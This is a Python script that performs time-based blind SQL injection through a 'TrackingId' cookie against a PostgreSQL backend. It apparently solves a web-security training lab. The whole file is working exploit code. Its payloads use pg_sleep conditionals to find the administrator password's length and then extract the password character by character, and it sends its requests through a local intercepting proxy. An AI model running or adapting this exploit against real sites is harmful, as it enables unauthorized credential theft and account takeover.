import requests
from requests import cookies
from requests.sessions import Session
import urllib3
import urllib
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080' }

def get_tracking_id(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    return s.cookies.get_dict()


def get_password(s,url,num,dict_cookies):
    trackingId = dict_cookies['TrackingId']
    password = ""
    for i in range(1,num+1):
        for j in range(32,126):
            sql_payload = "'||(select case when (username='administrator' and ascii(substr(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encode = urllib.parse.quote(sql_payload)
            dict_cookies['TrackingId']=trackingId+sql_payload_encode
            r = s.get(url, cookies=dict_cookies,verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds())>=10:
                password = password + chr(j)
                sys.stdout.write('\r'+password)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r'+password+chr(j))
                sys.stdout.flush()


def get_password_len(s, url, dict_cookies):
    trackingId = dict_cookies['TrackingId']
    for i in range(1,50):
        sql_payload = "'||(select case when (username='administrator' and length(password)>%s) then pg_sleep(10) else pg_sleep(-1) end from users)--" %i
        sql_payload_encode = urllib.parse.quote(sql_payload)
        dict_cookies['TrackingId']=trackingId+sql_payload_encode
        r = s.get(url, cookies=dict_cookies,verify=False, proxies=proxies)
        if int(r.elapsed.total_seconds())<9:
            return i
    return False


if __name__=="__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url> " % sys.argv[0])
        print('[-] Example: %s www.example.com ' % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    cookies_dict = get_tracking_id(s, url)
    trackingId = cookies_dict['TrackingId']

    if cookies_dict:
        print("[+] SQL Cookies extracted: "+str(cookies_dict))
    else:
        print("[-] SQL Cookies not retrived")
        sys.exit(-1)

    cookies_dict['TrackingId'] = trackingId
    pass_len = get_password_len(s,url,cookies_dict)
    if pass_len:
        print("[+] SQL Length of password: "+str(pass_len))
    else:
        print("[-] SQL Password length not retrived")
        sys.exit(-1)

    cookies_dict['TrackingId'] = trackingId
    get_password(s,url,pass_len,cookies_dict)